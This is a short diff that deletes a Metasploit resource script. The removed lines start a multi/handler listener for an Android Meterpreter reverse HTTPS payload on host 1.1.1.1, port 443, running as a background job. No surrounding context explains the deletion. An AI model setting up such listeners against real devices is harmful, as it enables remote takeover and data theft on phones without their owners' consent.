@@ -1,6 +1,1 @@
-use multi/handler
-set PAYLOAD android/meterpreter_reverse_https
-set LHOST 1.1.1.1
-set LPORT 443
-set ExitOnSession false
-exploit -j -z
+
